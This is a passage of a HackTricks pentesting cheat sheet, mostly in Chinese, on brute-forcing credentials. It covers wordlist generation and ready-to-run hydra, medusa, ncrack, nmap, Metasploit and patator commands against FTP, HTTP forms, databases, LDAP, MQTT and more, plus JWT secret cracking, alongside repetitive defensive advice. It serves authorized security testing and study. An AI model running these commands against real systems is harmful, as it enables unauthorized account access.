# 暴力破解 - 速查表

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)轻松构建和自动化由全球**最先进**的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？想要在HackTricks中看到你的**公司广告**吗？或者你想要访问**PEASS的最新版本或下载HackTricks的PDF**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **通过向[hacktricks repo](https://github.com/carlospolop/hacktricks)和[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)提交PR来分享你的黑客技巧**。

</details>

## 默认凭证

在谷歌中搜索正在使用的技术的默认凭证，或者尝试以下链接：

* [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
* [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
* [**http://www.vulnerabilityassessment.co.uk/passwordsC.htm**](http://www.vulnerabilityassessment.co.uk/passwordsC.htm)
* [**https://192-168-1-1ip.mobi/default-router-passwords-list/**](https://192-168-1-1ip.mobi/default-router-passwords-list/)
* [**https://datarecovery.com/rd/default-passwords/**](https://datarecovery.com/rd/default-passwords/)
* [**https://bizuns.com/default-passwords-list**](https://bizuns.com/default-passwords-list)
* [**https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv**](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/default-passwords.csv)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://www.cirt.net/passwords**](https://www.cirt.net/passwords)
* [**http://www.passwordsdatabase.com/**](http://www.passwordsdatabase.com)
* [**https://many-passwords.github.io/**](https://many-passwords.github.io)
* [**https://theinfocentric.com/**](https://theinfocentric.com/)

## **创建自己的字典**

尽可能多地了解目标，并生成自定义字典。可能有用的工具：

### Crunch
```bash
crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet
crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst)

@ Lower case alpha characters
, Upper case alpha characters
% Numeric characters
^ Special characters including spac
crunch 6 8 -t ,@@^^%%
```
### Cewl

Cewl is a tool used for generating custom wordlists by scraping websites or documents. It is particularly useful for password cracking and brute-force attacks. Cewl works by analyzing the target website or document and extracting relevant keywords and phrases. These keywords and phrases are then combined to create a wordlist that can be used in password guessing attacks.

To use Cewl, you need to provide it with a target URL or a document. Cewl will crawl the target and extract words based on various criteria such as word length, frequency, and relevance. It can also follow links and extract words from linked pages. The extracted words are then processed to remove duplicates and irrelevant terms.

Cewl can be run with different options to customize its behavior. For example, you can specify the minimum and maximum word length, the number of words to extract, and the depth of crawling. You can also specify whether to include numbers, symbols, or special characters in the generated wordlist.

Once the wordlist is generated, it can be used with password cracking tools like John the Ripper or Hashcat. These tools will systematically try each word in the list as a potential password until the correct one is found.

Cewl is a powerful tool for generating targeted wordlists that can greatly increase the efficiency of brute-force attacks. However, it is important to note that brute-forcing is an aggressive and potentially illegal technique. It should only be used with proper authorization and for legitimate purposes such as penetration testing.
```bash
cewl example.com -m 5 -w words.txt
```
### [CUPP](https://github.com/Mebus/cupp)

根据你对受害者的了解（姓名、日期等）生成密码
```
python3 cupp.py -h
```
### [Wister](https://github.com/cycurity/wister)

Wister是一个字典生成工具，允许您提供一组单词，从给定的单词中创建多个变体，从而创建一个针对特定目标的独特和理想的字典。
```bash
python3 wister.py -w jane doe 2022 summer madrid 1998 -c 1 2 3 4 5 -o wordlist.lst

__          _______  _____ _______ ______ _____
\ \        / /_   _|/ ____|__   __|  ____|  __ \
\ \  /\  / /  | | | (___    | |  | |__  | |__) |
\ \/  \/ /   | |  \___ \   | |  |  __| |  _  /
\  /\  /   _| |_ ____) |  | |  | |____| | \ \
\/  \/   |_____|_____/   |_|  |______|_|  \_\

Version 1.0.3                    Cycurity

Generating wordlist...
[########################################] 100%
Generated 67885 lines.

Finished in 0.920s.
```
### [pydictor](https://github.com/LandGrey/pydictor)

### 字典列表

* [**https://github.com/danielmiessler/SecLists**](https://github.com/danielmiessler/SecLists)
* [**https://github.com/Dormidera/WordList-Compendium**](https://github.com/Dormidera/WordList-Compendium)
* [**https://github.com/kaonashi-passwords/Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi)
* [**https://github.com/google/fuzzing/tree/master/dictionaries**](https://github.com/google/fuzzing/tree/master/dictionaries)
* [**https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm**](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)
* [**https://weakpass.com/wordlist/**](https://weakpass.com/wordlist/)
* [**https://wordlists.assetnote.io/**](https://wordlists.assetnote.io/)
* [**https://github.com/fssecur3/fuzzlists**](https://github.com/fssecur3/fuzzlists)
* [**https://hashkiller.io/listmanager**](https://hashkiller.io/listmanager)
* [**https://github.com/Karanxa/Bug-Bounty-Wordlists**](https://github.com/Karanxa/Bug-Bounty-Wordlists)

<figure><img src="/.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

\
使用[**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks)可以轻松构建和自动化由全球最先进的社区工具提供支持的工作流程。\
立即获取访问权限：

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## 服务

按服务名称按字母顺序排列。

### AFP
```bash
nmap -p 548 --script afp-brute <IP>
msf> use auxiliary/scanner/afp/afp_login
msf> set BLANK_PASSWORDS true
msf> set USER_AS_PASS true
msf> set PASS_FILE <PATH_PASSWDS>
msf> set USER_FILE <PATH_USERS>
msf> run
```
### AJP

AJP (Apache JServ Protocol) 是一种用于在 Apache Web 服务器和 Tomcat 应用服务器之间进行通信的协议。它允许 Apache 服务器将请求转发给 Tomcat 服务器处理，并将响应返回给客户端。

攻击者可以利用 AJP 协议进行暴力破解攻击，尝试猜测有效的用户名和密码组合来获取未授权访问。这种攻击方法被称为 AJP 暴力破解攻击。

在进行 AJP 暴力破解攻击时，攻击者使用自动化工具来尝试大量的用户名和密码组合。这些工具通常使用字典文件，其中包含常见的用户名和密码组合，以及其他可能的组合。

为了防止 AJP 暴力破解攻击，可以采取以下措施：

- 使用强密码：确保使用强密码来减少猜测的可能性。
- 锁定账户：在一定的失败尝试次数后，锁定账户以防止进一步的猜测。
- 使用多因素身份验证：使用多因素身份验证可以增加账户的安全性，即使密码被猜测也难以入侵。
- 监控登录活动：监控登录活动可以及时发现异常行为并采取相应的措施。

通过采取这些措施，可以有效地防止 AJP 暴力破解攻击，并提高系统的安全性。
```bash
nmap --script ajp-brute -p 8009 <IP>
```
### Cassandra

Cassandra是一个开源的分布式NoSQL数据库系统，它被设计用于处理大规模的数据集。它具有高度可扩展性和高性能的特点，适用于需要处理大量数据的应用程序。

#### 基本原理

Cassandra使用了一种称为"分布式哈希表"的数据模型，它将数据分布在多个节点上。每个节点都负责存储和处理一部分数据，这样可以实现数据的分布式存储和处理。

Cassandra使用了一种称为"一致性哈希"的算法来确定数据在节点之间的分布。这个算法将数据的键映射到一个哈希环上的位置，然后根据节点在哈希环上的位置来确定数据应该存储在哪个节点上。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或破解加密算法。在Cassandra中，暴力破解可以用于尝试破解用户的密码或访问权限。

暴力破解的基本原理是通过尝试所有可能的密码组合来破解密码。攻击者可以使用自动化工具来自动尝试大量的密码组合，直到找到正确的密码为止。

为了防止暴力破解攻击，Cassandra提供了一些安全措施，如密码策略和登录尝试限制。管理员可以配置密码策略来要求用户使用强密码，并设置登录尝试限制来限制失败的登录尝试次数。

然而，暴力破解仍然是一种有效的攻击技术，因此管理员应该采取额外的安全措施来保护Cassandra数据库，如使用多因素身份验证和监控登录活动。
```bash
nmap --script cassandra-brute -p 9160 <IP>
```
### CouchDB

CouchDB is a NoSQL database that uses JSON to store data. It is known for its distributed architecture and ability to handle large amounts of data. CouchDB is often used in web applications and is compatible with various programming languages.

#### Brute Force Attacks on CouchDB

Brute force attacks on CouchDB involve attempting to gain unauthorized access to the database by systematically trying all possible combinations of usernames and passwords. This method relies on the assumption that the correct credentials can be found through trial and error.

#### Prevention and Mitigation

To prevent brute force attacks on CouchDB, it is important to implement strong authentication measures. This includes using complex and unique passwords, enforcing password policies, and implementing account lockouts after a certain number of failed login attempts.

Additionally, it is recommended to monitor login attempts and implement rate limiting to prevent multiple login attempts within a short period of time. Regularly updating CouchDB to the latest version and applying security patches can also help mitigate the risk of brute force attacks.

#### Conclusion

Brute force attacks on CouchDB can pose a significant security risk if proper preventive measures are not in place. By implementing strong authentication measures and regularly updating the database, the risk of unauthorized access can be greatly reduced.
```bash
msf> use auxiliary/scanner/couchdb/couchdb_login
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
```
### Docker Registry

Docker Registry is a service that allows you to store and distribute Docker images. It is a central repository where you can upload and download Docker images. Docker Registry can be either public or private, depending on your needs.

#### Brute Force Attack

A brute force attack is a method used by hackers to gain unauthorized access to a system or account by systematically trying all possible combinations of passwords or encryption keys until the correct one is found. This attack relies on the assumption that the password or encryption key is weak and can be easily guessed.

#### Brute Forcing Docker Registry

Brute forcing a Docker Registry involves attempting to gain unauthorized access to the registry by systematically trying different combinations of usernames and passwords. This can be done using automated tools that can generate and test a large number of combinations in a short amount of time.

#### Mitigating Brute Force Attacks

To mitigate brute force attacks on your Docker Registry, you can implement the following security measures:

1. Use strong and complex passwords: Ensure that your passwords are long, contain a combination of uppercase and lowercase letters, numbers, and special characters.

2. Implement account lockout policies: Set up a mechanism that locks user accounts after a certain number of failed login attempts. This can help prevent brute force attacks by temporarily disabling the account.

3. Enable multi-factor authentication (MFA): Implement MFA to add an extra layer of security to your Docker Registry. This requires users to provide additional verification, such as a code sent to their mobile device, in addition to their username and password.

4. Monitor and analyze logs: Regularly monitor and analyze the logs of your Docker Registry to detect any suspicious login attempts or patterns that may indicate a brute force attack. Implementing a log management system can help automate this process.

By implementing these security measures, you can significantly reduce the risk of a successful brute force attack on your Docker Registry.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
```
# Elasticsearch

Elasticsearch is a distributed, RESTful search and analytics engine built on top of Apache Lucene. It provides a scalable solution for storing, searching, and analyzing large volumes of data in near real-time.

## Brute Force Attacks

Brute force attacks are a common method used by hackers to gain unauthorized access to Elasticsearch instances. In a brute force attack, the hacker systematically tries all possible combinations of usernames and passwords until the correct credentials are found.

### Protecting Against Brute Force Attacks

To protect against brute force attacks, it is important to implement strong security measures. Here are some best practices to follow:

1. **Use strong passwords**: Ensure that all Elasticsearch user accounts have strong, unique passwords that are not easily guessable.

2. **Implement account lockouts**: Set up account lockouts after a certain number of failed login attempts. This can help prevent brute force attacks by temporarily locking out the attacker.

3. **Enable multi-factor authentication**: Implement multi-factor authentication to add an extra layer of security. This can help protect against brute force attacks even if the attacker manages to obtain the correct username and password.

4. **Monitor for suspicious activity**: Regularly monitor Elasticsearch logs and network traffic for any signs of brute force attacks. Implementing a robust logging and monitoring system can help detect and respond to such attacks in a timely manner.

5. **Keep Elasticsearch up to date**: Regularly update Elasticsearch to the latest version to ensure that any security vulnerabilities are patched.

By following these best practices, you can significantly reduce the risk of brute force attacks on your Elasticsearch instances.
```
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 9200 http-get /
```
### FTP

FTP（文件传输协议）是一种用于在计算机之间传输文件的标准网络协议。它允许用户通过网络连接到远程计算机，并在本地计算机和远程计算机之间传输文件。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在FTP中，暴力破解是指使用自动化工具或脚本来尝试不同的用户名和密码组合，直到找到正确的凭据为止。

暴力破解可以通过以下步骤进行：

1. 枚举用户名：攻击者使用字典或生成器来生成可能的用户名列表。
2. 枚举密码：攻击者使用字典或生成器来生成可能的密码列表。
3. 尝试登录：攻击者使用生成的用户名和密码组合尝试登录到FTP服务器。
4. 检查结果：如果登录成功，则攻击者获得了有效的凭据，并可以访问FTP服务器上的文件。

为了防止暴力破解攻击，FTP服务器通常会实施以下安全措施：

- 强密码策略：要求用户使用复杂的密码，并定期更改密码。
- 登录尝试限制：限制每个用户的登录尝试次数，以防止暴力破解。
- 账户锁定：在多次失败的登录尝试后，锁定用户账户一段时间，以防止进一步的攻击。

尽管FTP是一种常见的文件传输协议，但由于其安全性较低，现在已经有更安全的替代方案可供选择，如SFTP（安全文件传输协议）和FTPS（FTP安全）。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ftp
ncrack -p 21 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ftp
```
### HTTP通用暴力破解

#### [**WFuzz**](../pentesting-web/web-tool-wfuzz.md)

### HTTP基本身份验证
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst sizzle.htb.local http-get /certsrv/
# Use https-get mode for https
medusa -h <IP> -u <username> -P  <passwords.txt> -M  http -m DIR:/path/to/auth -T 10
```
### HTTP - 提交表单

Brute forcing is a common technique used to crack passwords or gain unauthorized access to a system. It involves systematically trying all possible combinations of characters until the correct password is found. This method can be used to exploit vulnerabilities in web applications that use HTTP POST requests to submit form data.

Brute forcing an HTTP POST form involves sending multiple requests to the target server, each with a different set of credentials. The attacker typically uses a list of commonly used passwords or a dictionary of words to generate these combinations. The goal is to find the correct combination that allows access to the system.

To perform a brute force attack on an HTTP POST form, the attacker needs to identify the target form and its input fields. This can be done by inspecting the HTML source code of the web page or using tools like Burp Suite or OWASP ZAP.

Once the form and its input fields are identified, the attacker can automate the process of sending requests with different credentials using tools like Hydra or Medusa. These tools allow the attacker to specify the target URL, the form parameters, and the list of credentials to try.

It is important to note that brute forcing can be a time-consuming process, especially if the target system has implemented measures to prevent or detect such attacks. Additionally, brute forcing is considered an aggressive attack and may be illegal or against the terms of service of the targeted system.

Therefore, it is crucial to obtain proper authorization and legal permission before attempting any brute force attacks.
```bash
hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https
```
对于http**s**，你需要将 "http-post-form" 改为 "**https-post-form**"

### **HTTP - CMS --** (W)ordpress, (J)oomla or (D)rupal or (M)oodle
```bash
cmsmap -f W/J/D/M -u a -p a https://wordpress.com
```
### IMAP

IMAP（Internet Mail Access Protocol）是一种用于接收电子邮件的协议。它允许用户通过电子邮件客户端从邮件服务器上下载邮件。IMAP协议提供了许多功能，如在服务器上管理邮件夹、搜索邮件和同步多个设备上的邮件等。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在IMAP中，暴力破解可以用于尝试破解用户的登录凭据，以获取对其电子邮件的访问权限。

暴力破解通常涉及使用自动化工具来尝试大量的可能密码组合，直到找到正确的密码为止。攻击者可以使用字典文件、常见密码列表或生成的密码来进行暴力破解。

为了防止暴力破解攻击，用户应该选择强密码，并启用账户锁定功能，以限制登录尝试次数。此外，系统管理员可以使用入侵检测系统（IDS）或入侵防御系统（IPS）来监视和阻止暴力破解攻击。
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> imap -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 993 -f <IP> imap -V
nmap -sV --script imap-brute -p <PORT> <IP>
```
### IRC

IRC（Internet Relay Chat）是一种实时的互联网聊天协议。它允许用户通过IRC客户端在各种主题的聊天室中进行交流。IRC是一种非常古老的协议，但仍然被广泛使用。

### 暴力破解

暴力破解是一种常见的密码破解技术，它通过尝试所有可能的密码组合来获取未授权访问。这种方法通常用于攻击弱密码保护的系统。暴力破解可以使用字典攻击或穷举攻击的方式进行。

### 字典攻击

字典攻击是一种暴力破解技术，它使用预先准备好的密码列表（称为字典）来尝试破解密码。字典攻击通常比穷举攻击更快，因为它只尝试字典中的密码，而不是所有可能的组合。

### 穷举攻击

穷举攻击是一种暴力破解技术，它尝试使用所有可能的密码组合来破解密码。这种方法非常耗时，因为它需要尝试大量的组合。穷举攻击通常用于攻击没有强密码保护的系统。

### 暴力破解工具

有许多暴力破解工具可用于执行暴力破解攻击。这些工具通常具有自动化功能，可以自动尝试各种密码组合。一些常见的暴力破解工具包括Hydra、John the Ripper和Medusa。

### 防御暴力破解

为了防止暴力破解攻击，可以采取以下措施：

- 使用强密码：选择一个复杂的密码，包括字母、数字和特殊字符，并定期更改密码。
- 锁定账户：在一定的失败尝试次数后，锁定账户，防止进一步的尝试。
- 使用多因素身份验证：使用多个身份验证因素，如密码和手机验证码，以增加安全性。
- 监控登录活动：监控登录活动，及时发现异常行为并采取相应措施。

### 总结

暴力破解是一种常见的密码破解技术，通过尝试所有可能的密码组合来获取未授权访问。字典攻击和穷举攻击是常用的暴力破解方法。为了防止暴力破解攻击，应采取强密码、锁定账户、使用多因素身份验证和监控登录活动等措施。
```bash
nmap -sV --script irc-brute,irc-sasl-brute --script-args userdb=/path/users.txt,passdb=/path/pass.txt -p <PORT> <IP>
```
### ISCSI

iSCSI（Internet Small Computer System Interface）是一种用于在IP网络上传输SCSI命令的协议。它允许计算机通过网络连接到远程存储设备，就像它们直接连接到本地存储设备一样。iSCSI使用TCP/IP协议来提供远程存储访问，并通过将SCSI命令封装在IP数据包中来实现数据传输。

iSCSI的工作原理是通过在本地计算机和远程存储设备之间建立逻辑连接。本地计算机将SCSI命令发送到远程存储设备，远程存储设备执行这些命令并将结果返回给本地计算机。这种远程存储访问的方式使得计算机可以利用远程存储设备的容量和性能，而无需直接连接到它们。

iSCSI的一种常见用途是在虚拟化环境中使用。通过将虚拟机的磁盘映像存储在远程存储设备上，可以实现虚拟机的迁移和高可用性。此外，iSCSI还可以用于备份和存档，以及在分布式存储系统中实现数据共享。

尽管iSCSI提供了方便的远程存储访问，但它也存在一些安全风险。攻击者可以使用暴力破解等技术来尝试猜测iSCSI的凭据，并获取对远程存储设备的未授权访问。因此，在部署iSCSI时，必须采取适当的安全措施，如使用强密码、限制访问和加密数据传输，以保护远程存储的机密性和完整性。
```bash
nmap -sV --script iscsi-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 3260 <IP>
```
### JWT

JSON Web Token（JWT）是一种用于在网络应用之间传递信息的开放标准（RFC 7519）。它使用JSON对象作为安全令牌，以便在发送方和接收方之间传递声明。这些声明可以被验证和信任，因为它们是使用数字签名进行加密的。

JWT通常由三个部分组成：头部（Header）、载荷（Payload）和签名（Signature）。头部包含了令牌的类型和所使用的加密算法。载荷包含了要传递的声明信息，例如用户的身份信息。签名用于验证令牌的完整性和真实性。

攻击者可以使用暴力破解（Brute Force）技术来尝试破解JWT令牌的签名。暴力破解是一种通过尝试所有可能的组合来破解密码或令牌的方法。攻击者可以使用字典文件或自动生成的密码来尝试破解JWT令牌的签名，以获取未经授权的访问权限。

为了防止暴力破解攻击，开发人员应该采取一些预防措施。首先，使用强大的加密算法和密钥来保护JWT令牌的签名。其次，限制登录尝试次数，并在多次失败尝试后锁定用户账户。最后，定期更新密钥和令牌，以增加安全性。

总之，JWT是一种用于在网络应用之间传递信息的安全令牌。然而，开发人员必须注意保护JWT令牌的签名，以防止暴力破解攻击。
```bash
#hashcat
hashcat -m 16500 -a 0 jwt.txt .\wordlists\rockyou.txt

#https://github.com/Sjord/jwtcrack
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#John
john jwt.txt --wordlist=wordlists.txt --format=HMAC-SHA256

#https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py -d wordlists.txt <JWT token>

#https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc 1234567890 8

#https://github.com/mazen160/jwt-pwn
python3 jwt-cracker.py -jwt eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc -w wordlist.txt

#https://github.com/lmammino/jwt-cracker
jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ" "abcdefghijklmnopqrstuwxyz" 6
```
### LDAP

LDAP（轻量级目录访问协议）是一种用于访问和维护分布式目录服务的协议。它允许客户端通过网络连接到目录服务器，并执行各种操作，如搜索、添加、修改和删除目录条目。

LDAP是一种常见的协议，用于管理用户和组织的身份验证和授权信息。它通常用于企业环境中的身份验证和访问控制，以及电子邮件和其他应用程序中的用户帐户管理。

LDAP协议的一个重要特点是它支持基于用户名和密码的身份验证。这使得攻击者可以使用暴力破解技术来尝试猜测用户的密码。暴力破解是一种通过尝试所有可能的密码组合来破解密码的方法。

攻击者可以使用各种工具和技术来进行LDAP暴力破解攻击。这些工具可以自动化密码猜测过程，并尝试使用不同的用户名和密码组合来登录目标LDAP服务器。

为了防止LDAP暴力破解攻击，目标LDAP服务器应该实施一些安全措施，如限制登录尝试次数、使用强密码策略和启用账户锁定功能。此外，使用多因素身份验证可以提供额外的安全层级，以防止未经授权的访问。

作为安全专业人员，我们应该了解LDAP暴力破解攻击的原理和方法，并采取适当的措施来保护目标系统免受此类攻击的影响。
```bash
nmap --script ldap-brute -p 389 <IP>
```
### MQTT

MQTT（Message Queuing Telemetry Transport）是一种轻量级的消息传输协议，通常用于物联网设备之间的通信。它基于发布-订阅模式，允许设备通过中间代理（broker）进行消息的发布和订阅。

MQTT协议使用TCP/IP协议栈进行通信，并具有低带宽和低功耗的特点。它适用于网络带宽有限的环境，如传感器网络和移动设备。

MQTT协议的安全性取决于所使用的认证和加密机制。在实施MQTT时，应考虑使用安全的认证方式，如用户名和密码，以及使用TLS/SSL进行数据加密。

攻击者可以利用MQTT协议的弱点进行攻击，如使用暴力破解（brute force）方法尝试猜解用户名和密码，或者通过中间人攻击（man-in-the-middle）窃取传输的数据。

为了保护MQTT通信的安全性，应采取以下措施：

- 使用强密码和用户名，避免使用默认凭据；
- 启用TLS/SSL加密，确保数据在传输过程中的机密性；
- 限制连接到MQTT代理的设备数量，以防止拒绝服务（DoS）攻击；
- 定期更新MQTT代理和设备的软件版本，以修复已知的安全漏洞；
- 监控MQTT通信，及时检测异常活动。

通过采取这些措施，可以增强MQTT通信的安全性，保护物联网设备免受潜在的攻击。
```
ncrack mqtt://127.0.0.1 --user test –P /root/Desktop/pass.txt -v
```
### Mongo

Mongo是一种流行的NoSQL数据库，常用于存储大量非结构化数据。由于其广泛的应用，Mongo成为黑客攻击的目标之一。在渗透测试中，使用暴力破解是一种常见的攻击方法，用于尝试破解Mongo数据库的凭据。

暴力破解是一种通过尝试所有可能的组合来破解密码的方法。对于Mongo数据库，黑客可以使用暴力破解工具来尝试不同的用户名和密码组合，直到找到正确的凭据。这种攻击方法的成功取决于密码的复杂性和强度。

为了保护Mongo数据库免受暴力破解攻击，以下是一些建议的安全措施：

1. 使用强密码：确保Mongo数据库的凭据使用强密码，包括大写字母、小写字母、数字和特殊字符的组合。避免使用常见的密码，如"password"或"123456"。

2. 实施账户锁定机制：在一定的失败尝试次数后，暂时锁定账户，以防止暴力破解攻击。这可以通过配置Mongo数据库的安全设置来实现。

3. 使用访问控制列表（ACL）：限制对Mongo数据库的访问权限，只允许授权的用户或IP地址访问。这可以通过配置Mongo数据库的网络访问控制列表来实现。

4. 定期更新凭据：定期更改Mongo数据库的凭据，以增加安全性。确保使用不同的密码，并避免重复使用旧密码。

5. 监控登录活动：监控Mongo数据库的登录活动，及时检测和响应任何可疑的登录尝试。这可以通过使用日志记录和安全监控工具来实现。

通过采取这些安全措施，可以提高Mongo数据库的安全性，减少暴力破解攻击的风险。
```bash
nmap -sV --script mongodb-brute -n -p 27017 <IP>
use auxiliary/scanner/mongodb/mongodb_login
```
### MySQL

MySQL是一种流行的关系型数据库管理系统，广泛用于Web应用程序和其他数据驱动的应用程序中。MySQL使用SQL语言进行查询和管理数据。

#### 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在MySQL中，暴力破解可以用于尝试猜测数据库用户的密码，以获取未经授权的访问权限。

暴力破解通常涉及使用自动化工具或脚本来尝试大量的可能密码组合，直到找到正确的密码为止。攻击者可以使用常见的密码列表、字典文件或生成的密码组合来进行暴力破解。

为了防止暴力破解攻击，MySQL管理员可以采取以下措施：

- 使用强密码策略，要求用户设置复杂的密码。
- 启用账户锁定功能，限制登录尝试次数。
- 监控登录活动，检测异常登录尝试。
- 使用防火墙或网络入侵检测系统来阻止暴力破解攻击。

尽管暴力破解是一种有效的攻击技术，但它通常需要大量时间和计算资源。因此，使用强密码和其他安全措施可以大大降低暴力破解的成功率。
```bash
# hydra
hydra -L usernames.txt -P pass.txt <IP> mysql

# msfconsole
msf> use auxiliary/scanner/mysql/mysql_login; set VERBOSE false

# medusa
medusa -h <IP/Host> -u <username> -P <password_list> <-f | to stop medusa on first success attempt> -t <threads> -M mysql
```
# OracleSQL

OracleSQL是一种强大的关系型数据库管理系统，广泛用于企业级应用程序和数据管理。它提供了一套丰富的功能和工具，用于管理和操作数据库。

## 暴力破解

暴力破解是一种常见的攻击技术，用于尝试破解密码或访问受保护的系统。在OracleSQL中，暴力破解可以用于尝试破解数据库用户的密码。

以下是一些常用的暴力破解方法和资源：

- 字典攻击：使用预先准备好的密码字典尝试破解密码。
- 暴力破解工具：使用专门设计的工具，如Hydra或Medusa，进行自动化的暴力破解攻击。
- 多线程攻击：使用多个并行线程同时尝试不同的密码组合，以加快破解速度。
- GPU加速：利用图形处理器（GPU）的并行计算能力，加速暴力破解过程。
- 云计算平台：利用云计算平台的弹性和计算资源，进行大规模的暴力破解攻击。

在进行暴力破解时，需要注意以下几点：

- 合法性：仅在合法授权的情况下进行暴力破解，以遵守法律和道德规范。
- 密码策略：了解目标系统的密码策略，以便选择更有可能成功的密码组合。
- 防护措施：目标系统可能会采取一些防护措施，如账户锁定或延迟响应，以防止暴力破解攻击。

暴力破解是一种强有力的攻击技术，但也需要谨慎使用，并遵守法律和道德规范。
```bash
patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
为了使用**patator**进行**oracle_login**，您需要**安装**以下内容：
```bash
pip3 install cx_Oracle --upgrade
```
[离线OracleSQL哈希暴力破解](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**版本11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2**和**11.2.0.3**)：
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
